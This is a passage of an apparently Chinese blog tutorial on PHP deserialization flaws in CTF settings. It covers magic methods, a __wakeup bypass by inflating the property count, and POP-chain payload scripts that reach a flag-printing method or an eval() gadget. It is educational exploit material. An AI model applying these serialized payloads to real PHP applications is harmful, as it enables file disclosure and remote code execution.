class="php">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me-&gt;getInfo();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//存在__sleep()函数，$info属性不会被存储</span></span></span><br><span class="line"><span class="php">$temp = serialize($me);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $temp . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me = unserialize($temp);  <span class="comment">// info属性也会被反序列化</span></span></span><br><span class="line"><span class="php"><span class="comment">//__wakeup()组装的$info</span></span></span><br><span class="line"><span class="php">var_dump($me);</span></span><br><span class="line"><span class="php"><span class="comment">//$me-&gt;getInfo();</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>__toString()</strong></p><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p><p>就是当使用  echo 对象名    因为echo只能用来输出字符串 当用在输出对象时,就会在类里面寻找__toString()  输出这个方法的返回值<br><strong>实例</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">xiaoyang</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $xiaoyang;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($xiaoyang)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;xiaoyang = $xiaoyang;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"-----------------"</span>.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;xiaoyang;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$class = <span class="keyword">new</span> xiaoyang(<span class="string">'hello xiaoyang'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="输出"><a href="#输出" class="headerlink" title="   输出:"></a>   输出:</h2><pre><code>hello xiaoyang[Finished in 0.1s]</code></pre><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)  </span></span><br><span class="line"><span class="php">      <span class="comment">//strchr()返回/及其剩余的部分  strstr()的别名</span></span></span><br><span class="line"><span class="php">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span></span><br><span class="line"><span class="php">      <span class="comment">// show_source()   别名 highlight_file()   测试文件 进行 PHP 语法高亮显示：</span></span></span><br><span class="line"><span class="php">      <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  &#125;  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span></span><br><span class="line"><span class="php">  &#125; </span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="string">''</span> ;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;     </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; </span></span><br><span class="line"><span class="php">  show_source(<span class="string">'index.php'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">  $file=base64_decode($_GET[<span class="string">'file'</span>]); </span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> unserialize($file); </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span> #<span class="comment">&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p><strong>destruct()方法会读取文件<br>思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，但是</strong>wakeup会在unserialize之前执行，所以要绕过这一点。</p><p>当序列化属性要大于真实属性的个数时, 会跳过__wakeup()</p><p>先构造序列化<br>构造序列化对象：O:5:”SoFun”:1:{S:7:”\00*\00file”;s:8:”flag.php”;}</p><p>再修改属性值<br>构造序列化对象：O:5:”SoFun”:2:{S:7:”\00*\00file”;s:8:”flag.php”;}</p><p><strong>注:</strong><br>因为file是protect属性，所以需要加上\00*\00。再base64编码。</p><h3 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h3><h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><p><strong>类的构成</strong><br>类成员包括由属性和方法构成，类属性存在于数据段，类方法存在于代码段，对于一个类来说，类的方法不占用类的空间，占空间的只有类的属性</p><p><strong>概念</strong><br>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。</p><p><strong>POP链利用</strong><br>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来<br><strong>挖掘思路</strong><br>能控制反序列化的点<br>反序列化类有魔术方法<br>魔术方法里有敏感操作（常规思路）<br>魔术方法里无敏感操作，但是通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop链）</p><p><strong>例子</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">                $s1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">        &#125; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"xxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_GET[<span class="string">'string'</span>];</span></span><br><span class="line"><span class="php">unserialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>首先看到 flag的输出在 GetFlag 类的普通方法get_flag里面<br>要想让这个方法执行 就要构造POP链</p><p>步骤:</p><ol><li><p>在 string1类 中发现同名方法 get_flag() 在string类的<strong>tostring中 要想让</strong>tostring执行就想要把类string 当做字符串 因为调用的是参数str1 的方法 所以要将str1 赋值为 类getFlag 的对象<br>public function __construct(){</p><pre><code>  $this-&gt;str1 = new GetFlag();    //将$str1赋值为  类Getflag 的对象}</code></pre></li><li><p>在 fnc类 发现<strong>invoke方法 当把对象当做函数时会调用此方法 $this-&gt;mod2 = “字符串拼接”.$this-&gt;mod1;<br>将$mod1赋值为 string1类 的对象<br>public function </strong>construct(){</p><pre><code>  $this-&gt;mod1 = new string1();}</code></pre></li><li><p>funct类 中的<strong>call 方法 中 调用类mod1方法 且参数为$test2,即无法调用test2方法时自动调用 </strong>call方法<br>需要将mod1 赋值为 func类 的对象<br>public function __construct(){</p><pre><code>  $this-&gt;mod1 = new func();}</code></pre></li><li><p>在Call中的test1方法中存在$this-&gt;mod1-&gt;test2();，需要把$mod1赋值为funct的对象，让<strong>call自动调用。<br>public function </strong>construct(){</p><pre><code>  $this-&gt;mod1 = new funct();}</code></pre></li></ol><p>5.查找test1方法的调用点，在start_gg中发现$this-&gt;mod1-&gt;test1();，把$mod1赋值为start_gg类的对象，等待<strong>destruct()自动调用。<br>public function </strong>construct(){<br>          $this-&gt;mod1 = new Call();<br>        }</p><p>最终payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span>  // 当调用的成员方法不存在时调用此方法</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">                $s1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span>   //把一个对象当做函数去执行会调用此方法</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">        &#125; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str2;</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();    <span class="comment">//将$str1赋值为  类Getflag 的对象</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"xxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> start_gg;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>例子2</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>在 lemo类中调用得的是 normal类 但是在 evil类 中也有在normal类中的相同方法名 action<br>这时可以构造poc链来调用 evil类 中的 action方法<br>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data = <span class="string">"phpinfo()"</span>;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> lemon;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><h2 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h2><p>1、当成员属性数目大于实际数目时可绕过wakeup方法</p><p>2、CTF中成员属性数目前面多一个+可以绕过正则</p><h2 